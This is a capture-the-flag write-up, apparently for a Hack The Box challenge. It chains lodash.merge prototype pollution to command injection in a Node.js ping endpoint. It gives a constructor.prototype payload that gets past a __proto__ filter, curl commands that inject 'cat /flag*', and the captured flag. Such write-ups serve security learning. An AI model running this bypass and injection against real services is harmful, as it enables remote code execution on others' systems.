# Prototype Pollution → RCE (Node.js + lodash.merge)

## Target

Node.js/Express + lodash 4.6.1 (vulnerable merge). `/update` merges request body into User object then saves to DB. `/ping` runs `exec("ping -c 1 " + userObject.deviceIP)` — command injection with unsanitized deviceIP.

## Vulnerability Chain

1. `/update` filter blocks special chars in `req.body.deviceIP` (only `[a-zA-Z0-9.]` allowed)
2. `_.merge(userObject, sanitizedObject)` is called — lodash 4.6.1 vulnerable to prototype pollution
3. `User.prototype.deviceIP` can be polluted → any new User instance inherits the malicious deviceIP
4. `writeToDB()` uses `for...in` (enumerates inherited properties) → saves polluted value to DB
5. `/ping` init() reads from DB, sets own property → exec() runs the injected command

## Filter Bypass

The server sanitizes `__proto__` key:
```javascript
for (const property in req.body) {
    if (property.includes('__proto__')) { continue; }
    sanitizedObject[property] = req.body[property];
}
_.merge(userObject, sanitizedObject);
```

**Bypass**: use `constructor.prototype` — equivalent to `__proto__` for prototype access, but not blocked:
```json
{"constructor":{"prototype":{"deviceIP":"127.0.0.1; cat /flag*"}}}
```

lodash.merge traverses `object["constructor"]["prototype"]` → pollutes `User.prototype.deviceIP`.

## Exploit

Register fresh user (deviceIP must be null in DB — own property would shadow prototype):

```bash
# Register + login
curl -X POST "http://TARGET/register" -H "Content-Type: application/json" \
  -d '{"username":"pwn","password":"pwn"}'
curl -X POST "http://TARGET/login" -H "Content-Type: application/json" \
  -c cookies.txt -d '{"username":"pwn","password":"pwn"}'

# Pollute via constructor.prototype bypass
curl -X POST "http://TARGET/update" -H "Content-Type: application/json" \
  -b cookies.txt -d '{"constructor":{"prototype":{"deviceIP":"127.0.0.1; cat /flag*"}}}'

# Trigger RCE
curl "http://TARGET/ping" -b cookies.txt
```

## Result

`HTB{b92d441ff0595c904da50e3c3dbc92db}`

## Key Notes

- Must use a user with **null deviceIP** in DB — if own property exists, it shadows the prototype and writeToDB saves the own value (not the polluted prototype)
- `for...in` enumerates inherited enumerable properties — that's how prototype-polluted `deviceIP` gets saved to DB via `writeToDB()`
- `constructor.prototype` === `__proto__` for prototype access — standard bypass for `__proto__`-string filters
- lodash.merge ≤ 4.17.11 vulnerable; fixed by explicitly blocking `__proto__` and `constructor` keys in merge
- The DB-persistence path makes this exploit work even across multiple Node.js worker processes
